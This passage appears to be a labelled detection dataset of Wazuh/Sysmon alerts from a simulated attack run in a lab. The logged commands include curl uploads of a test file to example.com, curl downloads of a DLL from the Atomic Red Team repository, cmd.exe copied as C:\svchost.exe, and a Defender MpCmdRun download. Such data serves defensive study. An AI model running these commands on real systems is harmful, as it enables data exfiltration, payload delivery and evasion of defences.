c:\\\\temp\\\\atomictestfile.txt www.example.com &amp; C:\\\\Windows\\\\System32\\\\Curl.exe -d c:\\\\temp\\\\atomictestfile.txt www.example.com &amp; C:\\\\Windows\\\\System32\\\\Curl.exe --data c:\\\\temp\\\\atomictestfile.txt www.example.com", "processGuid": "{ff3427f9-4bfa-6868-1006-000000001400}", "logonId": "0xa45f0", "parentProcessId": "9660", "processId": "5752", "currentDirectory": "C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\", "utcTime": "2025-07-04 21:47:38.353", "hashes": "SHA1=A1BD7848E36F22021C68F4F24EDFDB7ACE42FCA3,MD5=90939B67542D77A32042B7C1945623B1,SHA256=3345339164CF384EFF527B6C3160FEA8D849A4231EC6CA80513E3A739E505168,IMPHASH=6C25E5A258C8C037CD5FBE44B10E696F", "parentImage": "C:\\\\Windows\\\\System32\\\\cmd.exe", "ruleName": "technique_id=T1059,technique_name=Command-Line Interface", "company": "curl, https://curl.se/", "commandLine": "C:\\\\Windows\\\\System32\\\\Curl.exe  -T c:\\\\temp\\\\atomictestfile.txt www.example.com", "integrityLevel": "High", "fileVersion": "8.13.0", "user": "SOCLAB\\\\snell", "terminalSessionId": "1", "parentUser": "SOCLAB\\\\snell"}, "system": {"eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\r\nUtcTime: 2025-07-04 21:47:38.353\r\nProcessGuid: {ff3427f9-4bfa-6868-1006-000000001400}\r\nProcessId: 5752\r\nImage: C:\\Windows\\System32\\curl.exe\r\nFileVersion: 8.13.0\r\nDescription: The curl executable\r\nProduct: The curl executable\r\nCompany: curl, https://curl.se/\r\nOriginalFileName: curl.exe\r\nCommandLine: C:\\Windows\\System32\\Curl.exe  -T c:\\temp\\atomictestfile.txt www.example.com \r\nCurrentDirectory: C:\\Users\\snell\\AppData\\Local\\Temp\\\r\nUser: SOCLAB\\snell\r\nLogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}\r\nLogonId: 0xA45F0\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=A1BD7848E36F22021C68F4F24EDFDB7ACE42FCA3,MD5=90939B67542D77A32042B7C1945623B1,SHA256=3345339164CF384EFF527B6C3160FEA8D849A4231EC6CA80513E3A739E505168,IMPHASH=6C25E5A258C8C037CD5FBE44B10E696F\r\nParentProcessGuid: {ff3427f9-4bfa-6868-0e06-000000001400}\r\nParentProcessId: 9660\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: \"cmd.exe\" /c C:\\Windows\\System32\\Curl.exe -T c:\\temp\\atomictestfile.txt www.example.com & C:\\Windows\\System32\\Curl.exe --upload-file c:\\temp\\atomictestfile.txt www.example.com & C:\\Windows\\System32\\Curl.exe -d c:\\temp\\atomictestfile.txt www.example.com & C:\\Windows\\System32\\Curl.exe --data c:\\temp\\atomictestfile.txt www.example.com\r\nParentUser: SOCLAB\\snell\"", "version": "5", "systemTime": "2025-07-04T21:47:38.3554131Z", "eventRecordID": "391556", "threadID": "3992", "computer": "Win11Client.soclab.internal", "task": "1", "processID": "3056", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 26, "mail": false, "description": "Suspicious Windows cmd shell execution", "groups": ["sysmon", "sysmon_eid1_detections", "windows"], "mitre": {"technique": ["Account Discovery", "Windows Command Shell"], "id": ["T1087", "T1059.003"], "tactic": ["Discovery", "Execution"]}, "id": "92032"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751665686.64136614", "timestamp": "2025-07-04T21:48:06.817+0000"}, "fields": {"timestamp": ["2025-07-04T21:48:06.817Z"]}, "sort": [1751665686817]}}
{"id": "9Rdp15cB1Hp-jZ7fRbI5", "description": "Suspicious Windows cmd shell execution", "label": "TP", "rule_level": 3, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.04", "_id": "9Rdp15cB1Hp-jZ7fRbI5", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"originalFileName": "curl.exe", "image": "C:\\\\Windows\\\\System32\\\\curl.exe", "product": "The curl executable", "parentProcessGuid": "{ff3427f9-4bfa-6868-0e06-000000001400}", "description": "The curl executable", "logonGuid": "{ff3427f9-1e7f-6868-f045-0a0000000000}", "parentCommandLine": "\\\"cmd.exe\\\" /c C:\\\\Windows\\\\System32\\\\Curl.exe -T c:\\\\temp\\\\atomictestfile.txt www.example.com &amp; C:\\\\Windows\\\\System32\\\\Curl.exe --upload-file c:\\\\temp\\\\atomictestfile.txt www.example.com &amp; C:\\\\Windows\\\\System32\\\\Curl.exe -d c:\\\\temp\\\\atomictestfile.txt www.example.com &amp; C:\\\\Windows\\\\System32\\\\Curl.exe --data c:\\\\temp\\\\atomictestfile.txt www.example.com", "processGuid": "{ff3427f9-4bfb-6868-1306-000000001400}", "logonId": "0xa45f0", "parentProcessId": "9660", "processId": "3380", "currentDirectory": "C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\", "utcTime": "2025-07-04 21:47:39.261", "hashes": "SHA1=A1BD7848E36F22021C68F4F24EDFDB7ACE42FCA3,MD5=90939B67542D77A32042B7C1945623B1,SHA256=3345339164CF384EFF527B6C3160FEA8D849A4231EC6CA80513E3A739E505168,IMPHASH=6C25E5A258C8C037CD5FBE44B10E696F", "parentImage": "C:\\\\Windows\\\\System32\\\\cmd.exe", "ruleName": "technique_id=T1059,technique_name=Command-Line Interface", "company": "curl, https://curl.se/", "commandLine": "C:\\\\Windows\\\\System32\\\\Curl.exe  --data c:\\\\temp\\\\atomictestfile.txt www.example.com", "integrityLevel": "High", "fileVersion": "8.13.0", "user": "SOCLAB\\\\snell", "terminalSessionId": "1", "parentUser": "SOCLAB\\\\snell"}, "system": {"eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\r\nUtcTime: 2025-07-04 21:47:39.261\r\nProcessGuid: {ff3427f9-4bfb-6868-1306-000000001400}\r\nProcessId: 3380\r\nImage: C:\\Windows\\System32\\curl.exe\r\nFileVersion: 8.13.0\r\nDescription: The curl executable\r\nProduct: The curl executable\r\nCompany: curl, https://curl.se/\r\nOriginalFileName: curl.exe\r\nCommandLine: C:\\Windows\\System32\\Curl.exe  --data c:\\temp\\atomictestfile.txt www.example.com\r\nCurrentDirectory: C:\\Users\\snell\\AppData\\Local\\Temp\\\r\nUser: SOCLAB\\snell\r\nLogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}\r\nLogonId: 0xA45F0\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=A1BD7848E36F22021C68F4F24EDFDB7ACE42FCA3,MD5=90939B67542D77A32042B7C1945623B1,SHA256=3345339164CF384EFF527B6C3160FEA8D849A4231EC6CA80513E3A739E505168,IMPHASH=6C25E5A258C8C037CD5FBE44B10E696F\r\nParentProcessGuid: {ff3427f9-4bfa-6868-0e06-000000001400}\r\nParentProcessId: 9660\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: \"cmd.exe\" /c C:\\Windows\\System32\\Curl.exe -T c:\\temp\\atomictestfile.txt www.example.com & C:\\Windows\\System32\\Curl.exe --upload-file c:\\temp\\atomictestfile.txt www.example.com & C:\\Windows\\System32\\Curl.exe -d c:\\temp\\atomictestfile.txt www.example.com & C:\\Windows\\System32\\Curl.exe --data c:\\temp\\atomictestfile.txt www.example.com\r\nParentUser: SOCLAB\\snell\"", "version": "5", "systemTime": "2025-07-04T21:47:39.2639599Z", "eventRecordID": "391562", "threadID": "3992", "computer": "Win11Client.soclab.internal", "task": "1", "processID": "3056", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 29, "mail": false, "description": "Suspicious Windows cmd shell execution", "groups": ["sysmon", "sysmon_eid1_detections", "windows"], "mitre": {"technique": ["Account Discovery", "Windows Command Shell"], "id": ["T1087", "T1059.003"], "tactic": ["Discovery", "Execution"]}, "id": "92032"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751665688.64158384", "timestamp": "2025-07-04T21:48:08.032+0000"}, "fields": {"timestamp": ["2025-07-04T21:48:08.032Z"]}, "sort": [1751665688032]}}
{"id": "3hdp15cB1Hp-jZ7fMbKv", "description": "Sysmon - Suspicious Process - svchost.exe", "label": "TP", "rule_level": 12, "rule_priority": "High", "alert": {"_index": "wazuh-alerts-4.x-2025.07.04", "_id": "3hdp15cB1Hp-jZ7fMbKv", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"originalFileName": "Cmd.Exe", "image": "C:\\\\svchost.exe", "product": "Microsoft\u00ae Windows\u00ae Operating System", "parentProcessGuid": "{ff3427f9-4be9-6868-f605-000000001400}", "description": "Windows Command Processor", "logonGuid": "{ff3427f9-1e7f-6868-f045-0a0000000000}", "parentCommandLine": "\\\"cmd.exe\\\" /c copy C:\\\\Windows\\\\System32\\\\cmd.exe C:\\\\svchost.exe &amp; C:\\\\svchost.exe /c echo T1105 &gt; \\\\\\\\localhost\\\\c$\\\\T1105.txt", "processGuid": "{ff3427f9-4bea-6868-f805-000000001400}", "logonId": "0xa45f0", "parentProcessId": "9852", "processId": "2224", "currentDirectory": "C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\", "utcTime": "2025-07-04 21:47:22.063", "hashes": "SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6", "parentImage": "C:\\\\Windows\\\\System32\\\\cmd.exe", "ruleName": "technique_id=T1059,technique_name=Command-Line Interface", "company": "Microsoft Corporation", "commandLine": "C:\\\\svchost.exe  /c echo T1105", "integrityLevel": "High", "fileVersion": "10.0.26100.4202 (WinBuild.160101.0800)", "user": "SOCLAB\\\\snell", "terminalSessionId": "1", "parentUser": "SOCLAB\\\\snell"}, "system": {"eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\r\nUtcTime: 2025-07-04 21:47:22.063\r\nProcessGuid: {ff3427f9-4bea-6868-f805-000000001400}\r\nProcessId: 2224\r\nImage: C:\\svchost.exe\r\nFileVersion: 10.0.26100.4202 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft\u00ae Windows\u00ae Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: C:\\svchost.exe  /c echo T1105 \r\nCurrentDirectory: C:\\Users\\snell\\AppData\\Local\\Temp\\\r\nUser: SOCLAB\\snell\r\nLogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}\r\nLogonId: 0xA45F0\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6\r\nParentProcessGuid: {ff3427f9-4be9-6868-f605-000000001400}\r\nParentProcessId: 9852\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: \"cmd.exe\" /c copy C:\\Windows\\System32\\cmd.exe C:\\svchost.exe & C:\\svchost.exe /c echo T1105 > \\\\localhost\\c$\\T1105.txt\r\nParentUser: SOCLAB\\snell\"", "version": "5", "systemTime": "2025-07-04T21:47:22.0716524Z", "eventRecordID": "391447", "threadID": "3992", "computer": "Win11Client.soclab.internal", "task": "1", "processID": "3056", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 1, "mail": true, "pci_dss": ["10.6.1", "11.4"], "hipaa": ["164.312.b"], "tsc": ["CC7.2", "CC7.3", "CC6.1", "CC6.8"], "description": "Sysmon - Suspicious Process - svchost.exe", "groups": ["windows", "sysmon", "sysmon_process-anomalies"], "mitre": {"technique": ["Process Injection"], "id": ["T1055"], "tactic": ["Defense Evasion", "Privilege Escalation"]}, "id": "61618", "nist_800_53": ["AU.6", "SI.4"], "gdpr": ["IV_35.7.d"]}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751665676.64008238", "full_log": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"eventID\":\"1\",\"version\":\"5\",\"level\":\"4\",\"task\":\"1\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2025-07-04T21:47:22.0716524Z\",\"eventRecordID\":\"391447\",\"processID\":\"3056\",\"threadID\":\"3992\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"Win11Client.soclab.internal\",\"severityValue\":\"INFORMATION\",\"message\":\"\\\"Process Create:\\r\\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\\r\\nUtcTime: 2025-07-04 21:47:22.063\\r\\nProcessGuid: {ff3427f9-4bea-6868-f805-000000001400}\\r\\nProcessId: 2224\\r\\nImage: C:\\\\svchost.exe\\r\\nFileVersion: 10.0.26100.4202 (WinBuild.160101.0800)\\r\\nDescription: Windows Command Processor\\r\\nProduct: Microsoft\u00ae Windows\u00ae Operating System\\r\\nCompany: Microsoft Corporation\\r\\nOriginalFileName: Cmd.Exe\\r\\nCommandLine: C:\\\\svchost.exe  /c echo T1105 \\r\\nCurrentDirectory: C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\\\r\\nUser: SOCLAB\\\\snell\\r\\nLogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}\\r\\nLogonId: 0xA45F0\\r\\nTerminalSessionId: 1\\r\\nIntegrityLevel: High\\r\\nHashes: SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6\\r\\nParentProcessGuid: {ff3427f9-4be9-6868-f605-000000001400}\\r\\nParentProcessId: 9852\\r\\nParentImage: C:\\\\Windows\\\\System32\\\\cmd.exe\\r\\nParentCommandLine: \\\"cmd.exe\\\" /c copy C:\\\\Windows\\\\System32\\\\cmd.exe C:\\\\svchost.exe & C:\\\\svchost.exe /c echo T1105 > \\\\\\\\localhost\\\\c$\\\\T1105.txt\\r\\nParentUser: SOCLAB\\\\snell\\\"\"},\"eventdata\":{\"ruleName\":\"technique_id=T1059,technique_name=Command-Line Interface\",\"utcTime\":\"2025-07-04 21:47:22.063\",\"processGuid\":\"{ff3427f9-4bea-6868-f805-000000001400}\",\"processId\":\"2224\",\"image\":\"C:\\\\\\\\svchost.exe\",\"fileVersion\":\"10.0.26100.4202 (WinBuild.160101.0800)\",\"description\":\"Windows Command Processor\",\"product\":\"Microsoft\u00ae Windows\u00ae Operating System\",\"company\":\"Microsoft Corporation\",\"originalFileName\":\"Cmd.Exe\",\"commandLine\":\"C:\\\\\\\\svchost.exe  /c echo T1105\",\"currentDirectory\":\"C:\\\\\\\\Users\\\\\\\\snell\\\\\\\\AppData\\\\\\\\Local\\\\\\\\Temp\\\\\\\\\",\"user\":\"SOCLAB\\\\\\\\snell\",\"logonGuid\":\"{ff3427f9-1e7f-6868-f045-0a0000000000}\",\"logonId\":\"0xa45f0\",\"terminalSessionId\":\"1\",\"integrityLevel\":\"High\",\"hashes\":\"SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6\",\"parentProcessGuid\":\"{ff3427f9-4be9-6868-f605-000000001400}\",\"parentProcessId\":\"9852\",\"parentImage\":\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\cmd.exe\",\"parentCommandLine\":\"\\\\\\\"cmd.exe\\\\\\\" /c copy C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\cmd.exe C:\\\\\\\\svchost.exe &amp; C:\\\\\\\\svchost.exe /c echo T1105 &gt; \\\\\\\\\\\\\\\\localhost\\\\\\\\c$\\\\\\\\T1105.txt\",\"parentUser\":\"SOCLAB\\\\\\\\snell\"}}}", "timestamp": "2025-07-04T21:47:56.165+0000"}, "fields": {"timestamp": ["2025-07-04T21:47:56.165Z"]}, "sort": [1751665676165]}}
{"id": "3xdp15cB1Hp-jZ7fMbKv", "description": "Windows command prompt started by an abnormal process", "label": "TP", "rule_level": 4, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.04", "_id": "3xdp15cB1Hp-jZ7fMbKv", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"originalFileName": "Cmd.Exe", "image": "C:\\\\Windows\\\\System32\\\\cmd.exe", "product": "Microsoft\u00ae Windows\u00ae Operating System", "parentProcessGuid": "{ff3427f9-2077-6868-5c01-000000001400}", "description": "Windows Command Processor", "logonGuid": "{ff3427f9-1e7f-6868-f045-0a0000000000}", "parentCommandLine": "\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\"", "processGuid": "{ff3427f9-4bea-6868-f905-000000001400}", "logonId": "0xa45f0", "parentProcessId": "9196", "processId": "1744", "currentDirectory": "C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\", "utcTime": "2025-07-04 21:47:22.577", "hashes": "SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6", "parentImage": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe", "ruleName": "technique_id=T1059,technique_name=Command-Line Interface", "company": "Microsoft Corporation", "commandLine": "\\\"cmd.exe\\\" /c cd \\\"%%ProgramData%%\\\\Microsoft\\\\Windows Defender\\\\platform\\\\4.18*\\\" &amp; MpCmdRun.exe -DownloadFile -url https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -path %%temp%%\\\\Atomic-license.txt", "integrityLevel": "High", "fileVersion": "10.0.26100.4202 (WinBuild.160101.0800)", "user": "SOCLAB\\\\snell", "terminalSessionId": "1", "parentUser": "SOCLAB\\\\snell"}, "system": {"eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\r\nUtcTime: 2025-07-04 21:47:22.577\r\nProcessGuid: {ff3427f9-4bea-6868-f905-000000001400}\r\nProcessId: 1744\r\nImage: C:\\Windows\\System32\\cmd.exe\r\nFileVersion: 10.0.26100.4202 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft\u00ae Windows\u00ae Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: \"cmd.exe\" /c cd \"%%ProgramData%%\\Microsoft\\Windows Defender\\platform\\4.18*\" & MpCmdRun.exe -DownloadFile -url https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -path %%temp%%\\Atomic-license.txt\r\nCurrentDirectory: C:\\Users\\snell\\AppData\\Local\\Temp\\\r\nUser: SOCLAB\\snell\r\nLogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}\r\nLogonId: 0xA45F0\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6\r\nParentProcessGuid: {ff3427f9-2077-6868-5c01-000000001400}\r\nParentProcessId: 9196\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" \r\nParentUser: SOCLAB\\snell\"", "version": "5", "systemTime": "2025-07-04T21:47:22.5804626Z", "eventRecordID": "391452", "threadID": "3992", "computer": "Win11Client.soclab.internal", "task": "1", "processID": "3056", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 38, "mail": false, "description": "Windows command prompt started by an abnormal process", "groups": ["sysmon", "sysmon_eid1_detections", "windows"], "mitre": {"technique": ["Windows Command Shell"], "id": ["T1059.003"], "tactic": ["Execution"]}, "id": "92052"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751665676.64014650", "timestamp": "2025-07-04T21:47:56.173+0000"}, "fields": {"timestamp": ["2025-07-04T21:47:56.173Z"]}, "sort": [1751665676173]}}
{"id": "6hdp15cB1Hp-jZ7fObJ_", "description": "curl.exe launched with commands to create a binary file", "label": "TP", "rule_level": 12, "rule_priority": "High", "alert": {"_index": "wazuh-alerts-4.x-2025.07.04", "_id": "6hdp15cB1Hp-jZ7fObJ_", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"originalFileName": "curl.exe", "image": "C:\\\\Windows\\\\System32\\\\curl.exe", "product": "The curl executable", "parentProcessGuid": "{ff3427f9-4bf5-6868-0706-000000001400}", "description": "The curl executable", "logonGuid": "{ff3427f9-1e7f-6868-f045-0a0000000000}", "parentCommandLine": "\\\"cmd.exe\\\" /c C:\\\\Windows\\\\System32\\\\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\\\\users\\\\public\\\\music\\\\allthethingsx64.dll &amp; C:\\\\Windows\\\\System32\\\\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll --output c:\\\\users\\\\public\\\\music\\\\allthethingsx64.dll &amp; C:\\\\Windows\\\\System32\\\\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\\\\programdata\\\\allthethingsx64.dll &amp; C:\\\\Windows\\\\System32\\\\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o %Temp%\\\\allthethingsx64.dll", "processGuid": "{ff3427f9-4bf7-6868-0a06-000000001400}", "logonId": "0xa45f0", "parentProcessId": "2724", "processId": "272", "currentDirectory": "C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\", "utcTime": "2025-07-04 21:47:35.582", "hashes": "SHA1=A1BD7848E36F22021C68F4F24EDFDB7ACE42FCA3,MD5=90939B67542D77A32042B7C1945623B1,SHA256=3345339164CF384EFF527B6C3160FEA8D849A4231EC6CA80513E3A739E505168,IMPHASH=6C25E5A258C8C037CD5FBE44B10E696F", "parentImage": "C:\\\\Windows\\\\System32\\\\cmd.exe", "ruleName": "technique_id=T1059,technique_name=Command-Line Interface", "company": "curl, https://curl.se/", "commandLine": "C:\\\\Windows\\\\System32\\\\Curl.exe  -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\\\\users\\\\public\\\\music\\\\allthethingsx64.dll", "integrityLevel": "High", "fileVersion": "8.13.0", "user": "SOCLAB\\\\snell", "terminalSessionId": "1", "parentUser": "SOCLAB\\\\snell"}, "system": {"eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\r\nUtcTime: 2025-07-04 21:47:35.582\r\nProcessGuid: {ff3427f9-4bf7-6868-0a06-000000001400}\r\nProcessId: 272\r\nImage: C:\\Windows\\System32\\curl.exe\r\nFileVersion: 8.13.0\r\nDescription: The curl executable\r\nProduct: The curl executable\r\nCompany: curl, https://curl.se/\r\nOriginalFileName: curl.exe\r\nCommandLine: C:\\Windows\\System32\\Curl.exe  -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\\users\\public\\music\\allthethingsx64.dll \r\nCurrentDirectory: C:\\Users\\snell\\AppData\\Local\\Temp\\\r\nUser: SOCLAB\\snell\r\nLogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}\r\nLogonId: 0xA45F0\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=A1BD7848E36F22021C68F4F24EDFDB7ACE42FCA3,MD5=90939B67542D77A32042B7C1945623B1,SHA256=3345339164CF384EFF527B6C3160FEA8D849A4231EC6CA80513E3A739E505168,IMPHASH=6C25E5A258C8C037CD5FBE44B10E696F\r\nParentProcessGuid: {ff3427f9-4bf5-6868-0706-000000001400}\r\nParentProcessId: 2724\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: \"cmd.exe\" /c C:\\Windows\\System32\\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\\users\\public\\music\\allthethingsx64.dll & C:\\Windows\\System32\\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll --output c:\\users\\public\\music\\allthethingsx64.dll & C:\\Windows\\System32\\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\\programdata\\allthethingsx64.dll & C:\\Windows\\System32\\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o %Temp%\\allthethingsx64.dll\r\nParentUser: SOCLAB\\snell\"", "version": "5", "systemTime": "2025-07-04T21:47:35.5972063Z", "eventRecordID": "391534", "threadID": "3992", "computer": "Win11Client.soclab.internal", "task": "1", "processID": "3056", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 1, "mail": true, "description": "curl.exe launched with commands to create a binary file", "groups": ["sysmon", "sysmon_eid1_detections", "windows"], "mitre": {"technique": ["Ingress Tool Transfer"], "id": ["T1105"], "tactic": ["Command and Control"]}, "id": "92074"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751665685.64080989", "timestamp": "2025-07-04T21:48:05.758+0000"}, "fields": {"timestamp": ["2025-07-04T21:48:05.758Z"]}, "sort": [1751665685758]}}
{"id": "6xdp15cB1Hp-jZ7fObJ_", "description": "Executable file dropped in Users\\Public folder", "label": "TP", "rule_level": 12, "rule_priority": "High", "alert": {"_index": "wazuh-alerts-4.x-2025.07.04", "_id": "6xdp15cB1Hp-jZ7fObJ_", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"image": "C:\\\\Windows\\\\System32\\\\curl.exe", "processGuid": "{ff3427f9-4bf7-6868-0a06-000000001400}", "processId": "272", "utcTime": "2025-07-04 21:47:36.986", "targetFilename": "C:\\\\Users\\\\Public\\\\Music\\\\allthethingsx64.dll", "ruleName": "technique_id=T1047,technique_name=File System Permissions Weakness", "creationUtcTime": "2025-07-04 21:47:36.985", "user": "SOCLAB\\\\snell"}, "system": 